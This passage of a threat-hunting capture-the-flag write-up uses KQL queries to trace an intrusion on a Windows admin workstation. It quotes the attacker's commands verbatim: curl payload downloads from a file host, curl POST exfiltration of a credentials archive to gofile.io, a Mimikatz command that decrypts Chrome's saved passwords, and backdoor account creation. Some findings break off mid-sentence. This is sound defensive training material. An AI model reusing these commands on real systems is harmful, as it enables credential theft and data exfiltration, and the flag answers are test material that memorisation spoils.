| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
```

**Output:** `"NETSTAT.EXE" -ano`  
**Finding:** In DeviceProcessEvents, filter AccountName for the compromised user and FileName/ProcessCommandLine for native Windows TCP/IP stack
<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->

---

### 🚩 Flag 15: DISCOVERY - Password Database Search

**Objective:** What command was used to search for password databases?

**What to Hunt:** Password management databases contain credentials for multiple systems, making them high-priority targets for credential theft.

**Hint 1:** Search for recursive file enumeration commands targeting specific extensions.

**Hint 2:** The attacker searched user directories for encrypted credential storage files.

**Reference:** Unsecured Credentials: Credentials In Files (T1552.001)

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2026-11-25))
| where AccountName contains "yuki.tanaka"
| where ProcessCommandLine has_any ("dir /s", "dir /b", "Get-ChildItem/gci", "-Recurse", "where /r", "forfiles")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
```

**Output:** `"cmd.exe" /c where /r C:\Users *.kdbx`  
**Finding:** Single-row result matching a recursive-search filter, on the compromised account, correlated in time and parent process with two confirmed recon commands, is the intended answer. My confidence is in the *method*, not in any value I'm naming. Parsing it piece by piece: cmd.exe /c runs one command then exits; "where" is the built-in Windows file-locator LOLBin; /r C:\Users forces recursion through every user profile; *.kdbx is the KeePass password database extension. That is precisely a discovery action against encrypted credential storage.
<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->

---

### 🚩 Flag 16: DISCOVERY - Credential File

**Objective:** Identify the discovered password file?

**What to Hunt:** Plaintext password files represent critical security failures and provide attackers with immediate access to multiple systems.

**Hint 1:** Check DeviceFileEvents for .txt or .lnk files accessed in the user's Desktop or Documents directories.

**Hint 2:** The filename reflects poor security hygiene that users commonly exhibit.

**Reference:** Unsecured Credentials: Credentials In Files (T1552.001)

**KQL Query:**

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2026-11-25))
| where DeviceName contains "azuki-adminpc"
| where InitiatingProcessCommandLine == 'Explorer.EXE'
| where FileName has_any (".txt", ".lnk")
| project TimeGenerated, DeviceName, FileName, FolderPath, ActionType, InitiatingProcessAccountName, InitiatingProcessCommandLine
```

**Output:** `OLD-Passwords.lnk`  
**Finding:** The result set is 13 Explorer.EXE-driven `FileCreated` events on azuki-adminpc, all under the `yuki.tanaka` profile. Eleven of them land in `C: Users\yuki.tanaka\AppData\Roaming\Microsoft\Windows\Recent\`, which is Windows' automatic shortcut store — a `.lnk` gets written there whenever a file is opened through Explorer. So each filename in that folder is a record of something the attacker actually opened.
<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->

---

### 🚩 Flag 17: COLLECTION - Data Staging Directory

**Objective:** Identify the data staging directory?

**What to Hunt:** Attackers establish staging locations in system directories to organise stolen data before exfiltration. These paths are critical IOCs for forensic investigation.

**Hint 1:** Search for directory creation or file operations in C: during the collection phase.

**Hint 2:** The staging path mimics legitimate Windows service directories to avoid suspicion.

**Reference:** Data Staged: Local Data Staging (T1074.001)

**KQL Query:**

```kql
DeviceFileEvents
| where TimeGenerated > datetime(2025-11-25T04:15:57.3989346Z)
| where DeviceName contains "azuki-adminpc"
| where FolderPath contains "staging"
| project TimeGenerated, DeviceName, FileName, FolderPath, ActionType,
          InitiatingProcessAccountName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Output:** `C:\ProgramData\Microsoft\Crypto\staging`  
**Finding:** Directly continues the credential-theft chain from Flag 15 and Flag 16. Flag 15 was "cmd.exe" /c where /r C:\Users *.kdbx — a hunt for
<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->

---

### 🚩 Flag 18: COLLECTION - Automated Data Collection Command

**Objective:** Identify the command used to copy banking documents?

**What to Hunt:** Scriptable file copying technique with retry logic and network optimisation is ideal for bulk data theft operations

**Hint 1:** Search DeviceProcessEvents for any copying executions of user documents to the staging directory.

**Hint 2:** The command copies financial records with specific flags for reliability.

**Reference:** Automated Collection (T1119)

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated > datetime(2025-11-25T04:15:57.3989346Z)
| where DeviceName contains "azuki-adminpc"
| where FileName contains "robocopy.exe"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Output:** `"Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP`  
**Finding:** Filter FileName to the Windows copy utilities — robocopy.exe, xcopy.exe, and cmd.exe — then search ProcessCommandLine for the staging path from Flag 17 and for words like bank, financial, statement, invoice, or Documents. Also try searching ProcessCommandLine alone for the staging path with no filename filter, in case the copy ran inside a script or a PowerShell one-liner. Sort by TimeGenerated ascending and stay in the same window as the earlier flags. When you find it, take the command line verbatim, switches and all — the flag wants the whole string, not a paraphrase.
<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->

---

### 🚩 Flag 19: COLLECTION - Exfiltration Volume

**Objective:** Identify the total number of archives created?

**What to Hunt:** Quantifying the number of archives created reveals the scope of data theft and helps prioritise impact assessment efforts.

**Hint 1:** Search DeviceFileEvents for compression tools used for file creations in the staging directory during the collection phase.

**Hint 2:** Count unique archive filenames prepared for exfiltration.

**Reference:** Archive Collected Data (T1560.001)

**KQL Query:**

```kql
DeviceFileEvents
| where TimeGenerated > datetime(2025-11-25T04:15:57.3989346Z)
| where DeviceName contains "azuki-adminpc"
| where FileName has_any ("tar", "zip", "diantz", "makecab", "certutil")
| where FolderPath contains "staging"
| project TimeGenerated, FileName, FolderPath, ActionType, InitiatingProcessCommandLine, InitiatingProcessAccountName, DeviceName
| order by TimeGenerated asc
```

**Output:** `8`  
**Finding:** `All-Contracts-2022.zip` existed at `C:\Users\yuki.tanaka\Documents\Contracts\Archive\`. The file at `C \ProgramData\Microsoft\Crypto\staging\Contracts\Archive\All-Contracts-2022.zip` is a **different file object**, on a different path, with its own MFT record, created at 04:37:49 on 25 Nov 2025 by the attacker's Robocopy process. It is not the same file. It's a new archive that the attacker brought into existence inside his own staging area. That's what the `staging` filter is telling you to count: archives that exist in the exfil staging directory as a result of this intrusion. All 8 qualify.
<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->

---

### 🚩 Flag 20: CREDENTIAL ACCESS - Credential Theft Tool Download

**Objective:** What command was used to download the credential theft tool?

**What to Hunt:** Attackers download specialised credential theft tools directly to compromised systems, adapting their toolkit to the target environment.

**Hint 1:** Search for file download commands executed after the initial malware deployment.

**Hint 2:** The attacker reused previously established hosting infrastructure.

**Reference:** Ingress Tool Transfer (T1105)

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated > datetime(2025-11-25T04:15:57.3989346Z)
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine has_any ("curl", "scp", "sftp", "tftp", "rsync", "finger", "wget", "winget", "yum")
//| where ProcessCommandLine has_any ("Invoke-WebRequest", "DownloadFile", "DownloadString", "certutil")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Output:** `"curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z`  
**Finding:** Of the nine curl commands, only two are actual downloads — rows 1 and 8 use `-L -o`, which writes a remote file to disk, while the other seven use `-X POST -F file=@`, which uploads. That knocks out the decoys like `credentials.tar.gz`, which are stolen data leaving, not tools arriving. Row 1 at 04:21 is the initial dropper, disguised as a Windows patch (`KB5044273-x64.7z`) and already attributed to the meterpreter implant by your earlier flags. That leaves row 8 at 05:55:34, pulling `m-temp.7z` from the same catbox.moe host the attacker had already established — the infrastructure reuse the hint pointed at. The clincher is what happens 76 seconds later: row 9 uploads `chrome-session-theft.tar.gz`. Chrome session tokens are DPAPI-encrypted and cannot be grabbed by the Robocopy staging that produced all the earlier archives, so a new capability landed on that box between 04:49 and 05:55, and row 8 is the only thing that landed. Hen
<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->

---

### 🚩 Flag 21: CREDENTIAL ACCESS - Browser Credential Theft

**Objective:** What command was used for browser credential theft?

**What to Hunt:** Modern credential theft targets browser password stores, extracting saved credentials without triggering LSASS-focused detections.

**Hint 1:** Search for the credential theft tool executing with module-specific parameters.

**Hint 2:** The attacker targeted a widely-used web browser's saved login data.

**Reference:** Credentials from Web Browsers (T1555.003)

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated > datetime(2025-11-25T04:15:57.3989346Z)
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine has_any ("login")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine, FolderPath
| order by TimeGenerated asc
```

**Output:** `"m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit`  
**Finding:** It's the answer because it's the only command that actually steals the passwords. The `::` syntax is Mimikatz, and the modules do one specific job: `privilege::debug` grabs the privilege needed for DPAPI work, `dpapi::chrome` reads Chrome's password store, `/in:...\Login Data` points at the file holding saved logins, and `/unprotect` decrypts them. It ran as the compromised user `yuki.tanaka` from `C:\Windows\Temp\cache\`, the staging folder from the archive in Flag 20, under a renamed one-letter binary to avoid detection. The other two rows don't qualify — `sc.exe start pushtoinstall login` is normal Windows Update noise running as `system`, and the `tar.exe` command only zips up `chrome-creds.txt` and `Chrome-Login-Data.db`, which are the files this Mimikatz command produced in the first place.
<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->

---

### 🚩 Flag 22: EXFILTRATION - Data Upload Command

**Objective:** Identify the command used to exfiltrate the first archive?

**What to Hunt:** Form-based HTTP uploads provide simple, reliable data exfiltration that blends with legitimate web traffic and supports large file transfers.

**Hint 1:** Search for HTTP client utilities executing POST requests with file upload parameters.

**Reference:** Exfiltration Over Web Service (T1567)

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated > datetime(2025-11-25T04:15:57.3989346Z)
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine has_any ("curl")
| project TimeGenerated, DeviceName,ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Output:** `"curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile`  
**Finding:** Nine curl runs on azuki-adminpc split into two shapes: two downloads using `-L -o` (pulling `.7z` tooling from catbox) and seven uploads using `-X POST -F file=@<archive>` to the gofile upload endpoint. The `@` prefix is what makes the uploads exfiltration — it tells curl to read the file off disk and attach it as multipart form data, so the archive goes out the wire. Within those seven, the earliest timestamp is 04:41:51, so the first archive exfiltrated was `credentials.tar.gz` to the url: https://store1.gofile.io/uploadFile.
<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->

---

### 🚩 Flag 23: EXFILTRATION - Cloud Storage Service

**Objective:** Identify the exfiltration service domain?

**What to Hunt:** Anonymous file sharing services provide temporary storage with self-destructing links, complicating data recovery and attribution.

**Hint 1:** Examine the URL in the exfiltration command from FLAG 22 - what domain is being targeted?

**Hint 2:** This service provides temporary file hosting commonly abused for malware distribution and data exfiltration.

**Reference:** Exfiltration to Cloud Storage (T1567.002)

**KQL Query:**

```kql
DeviceNetworkEvents
| where TimeGenerated > datetime(2025-11-25T04:15:57.3989346Z)
| where DeviceName contains "azuki-adminpc"
| where RemoteUrl != ""
| project RemoteUrl, RemoteIP, RemotePort, ActionType, InitiatingProcessFileName, InitiatingProcessCommandLine
```

**Output:** `gofile.io`  
**Finding:** Filtering `DeviceNetworkEvents` on azuki-adminpc for `curl.exe` returns two connections, both successful on port 443. One is `litter.catbox.moe` using `-L -o` to write a file to local disk — that's the attacker pulling tooling *in*. The other is row 18: `"curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile`, hitting `store1.gofile.io` at 45.112.123.227. The `-F file=@` flag means a file was being pushed *out*, so that's the exfiltration. Strip the `https://` and the `/uploadFile` path and you get the hostname `store1.gofile.io`; `store1` is just a numbered storage node that Gofile rotates between uploads, so it identifies a server, not the service. The registrable domain — and the two-part value the flag format asks for — is **`gofile.io`**.
<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->

---

### 🚩 Flag 24: EXFILTRATION - Destination Server

**Objective:** Identify the exfiltration server IP address?

**What to Hunt:** IP addresses enable network-layer blocking and threat intelligence correlation when domain-based controls fail or are bypassed.

**Hint 1:** Query DeviceNetworkEvents for connections to the exfiltration domain during the upload phase.

**Hint 2:** The RemoteIP field shows the actual server IP receiving the stolen data - this is a cloud hosting provider.

**Reference:** Exfiltration Over C2 Channel (T1041)

**KQL Query:**

```kql
DeviceNetworkEvents
| where TimeGenerated > datetime(2025-11-25T04:15:57.3989346Z)
| where DeviceName contains "azuki-adminpc"
| where RemoteUrl != ""
| where InitiatingProcessCommandLine contains "curl.exe"
| project RemoteUrl, RemoteIP, RemotePort, ActionType, InitiatingProcessFileName, InitiatingProcessCommandLine
```

**Output:** `45.112.123.227`  
**Finding:** Same process as the previous flag. We are merely searching for the RemoteURL field for the address of the service domain of the exfiltration.
<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->

---

### 🚩 Flag 25: CREDENTIAL ACCESS - Master Password Extraction

**Objective:** What file contains the extracted master password?

**What to Hunt:** Password managers store credentials for multiple systems. Extracting the master password provides access to all stored secrets.

**Hint 1:** Query DeviceFileEvents on azuki-adminpc for text files created during data collection.

**Hint 2:** The filename indicates the sensitive nature of its contents.

**Reference:** Credentials from Password Stores (T1555.005)

**KQL Query:**

```kql
DeviceFileEvents
| where TimeGenerated > datetime(2025-11-25T04:15:57.3989346Z)
| where DeviceName contains "azuki-adminpc"
| where InitiatingProcessCommandLine contains "pass" and InitiatingProcessCommandLine contains "txt"
| project TimeGenerated, DeviceName, FileName, FolderPath, ActionType, InitiatingProcessAccountName, InitiatingProcessCommandLine
```

**Output:** `KeePass-Master-Password.txt`  
**Finding:** The tar command shows exactly what the attacker packed into the stolen archive: `tar.exe -czf credentials.tar.gz Azuki-Passwords.kdbx KeePass-Master-Password.txt`. Everything after the archive name is a file going *into* the bundle — so the attacker grabbed two things, the locked KeePass vault (`.kdbx`) and a plain text file named `KeePass-Master-Password.txt`. A vault is useless without its master password, so pairing them is the whole point. That `.txt` is the only text file in the command, its name says what's in it, and it matches the expected `filename.txt` format. `credentials.tar.gz` is just the box it was shipped in, not the file holding the password.
<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->

---

## 🔎 Analyst Workflow

### From an investigative standpoint, the workflow progressed as follows:

**1 🚩:** Reviewing repeated RemoteInteractive logons to the admin workstation established the pivot origin outside the host's own subnet; the source IP address was **"10.1.0.204"**.  

**2 🚩:** Correlating those four remote logons on a single account name established which identity the attacker was reusing; the compromised account was **"yuki.tanaka"**.  

**3 🚩:** Filtering device names in the logon events confirmed the destination of the lateral movement; the target device was **"azuki-adminpc"**.  

**4 🚩:** Examining outbound network events tied to the download activity identified the public file host used for payload staging; the hosting service was **"litter.catbox.moe"**.  

**5 🚩:** Reviewing process command lines for downloads of .7z content isolated the ingress command disguised as a Windows update; the download command was **"\"curl.exe\" -L -o C:\\Windows\\Temp\\cache\\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z"**.  

**6 🚩:** Searching process events for archive utilities revealed the password-protected extraction into the cache directory; the extraction command was **"\"7z.exe\" x C:\\Windows\\Temp\\cache\\KB5044273-x64.7z -p******** -oC:\\Windows\\Temp\\cache\\ -y"**.  

**7 🚩:** Reviewing files written and executed from the extraction directory identified the command and control payload; the C2 beacon filename was **"meterpreter.exe"**.  

**8 🚩:** Inspecting the PipeName values in named pipe creation events tied to that process confirmed the C2 channel; the named pipe was **"\\Device\\NamedPipe\\msf-pipe-5902"**.  

**9 🚩:** Decoding the Base64 payload passed to PowerShell exposed the account creation step; the decoded command was **"net user yuki.tanaka2 B@ckd00r2024! /add"**.  

**10 🚩:** The decoded command named a lookalike variant of the compromised identity; the backdoor account was **"yuki.tanaka2"**.  

**11 🚩:** Decoding the follow-on Base64 PowerShell revealed the elevation of that new account; the privilege escalation command was **"net localgroup Administrators yuki.tanaka2 /add"**.  

**12 🚩:** Searching process events under the compromised account for session query utilities identified the RDP session enumeration; the command was **"qwinsta.exe"**.  

**13 🚩:** Reviewing native domain utilities run by the same account exposed trust reconnaissance; the command was **"\"nltest.exe\" /domain_trusts /all_trusts"**.  

**14 🚩:** Filtering for native TCP/IP tooling revealed enumeration of active connections; the command was **"\"NETSTAT.EXE\" -ano"**.  

**15 🚩:** Searching for recursive file searches under the user profiles exposed the hunt for KeePass databases; the command was **"\"cmd.exe\" /c where /r C:\\Users *.kdbx"**.  

**16 🚩:** Reviewing Explorer-driven file creation events under the compromised profile identified the credential-related item the attacker opened; the discovered password file was **"OLD-Passwords.lnk"**.  

**17 🚩:** Tracing file writes outside the user profile revealed the location where stolen documents were gathered; the staging directory was **"C:\\ProgramData\\Microsoft\\Crypto\\staging"**.  

**18 🚩:** Filtering copy utilities against the staging path exposed the bulk collection of financial records; the collection command was **"\"Robocopy.exe\" C:\\Users\\yuki.tanaka\\Documents\\Banking C:\\ProgramData\\Microsoft\\Crypto\\staging\\Banking /E /R:1 /W:1 /NP"**.  

**19 🚩:** Counting distinct archive objects created within the staging tree quantified the packaged data; the total number of archives created was **"8"**.  

**20 🚩:** Separating the download-shaped curl commands from the upload-shaped ones identified the second tool ingress; the credential theft tool download command was **"\"curl.exe\" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z"**.  

**21 🚩:** Reviewing command lines using Mimikatz module syntax revealed the attack on the Chrome password store; the browser credential theft command was **"\"m.exe\" privilege::debug \"dpapi::chrome /in:%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data /unprotect\" exit"**.  

**22 🚩:** Isolating the POST-shaped curl executions identified the first archive to leave the host; the exfiltration command was **"\"curl.exe\" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile"**.  

**23 🚩:** Reviewing the remote URLs in those upload connections identified the destination platform; the exfiltration service domain was **"gofile.io"**.  

**24 🚩:** Resolving the remote address behind those upload connections pinned the destination infrastructure; the exfiltration server IP address was **"45.112.123.227"**.  

**25 🚩:** Examining the tar command that built the stolen credential bundle showed the vault was taken together with its unlock key; the file containing the extracted master password was **"KeePass-Master-Password.txt"**.  
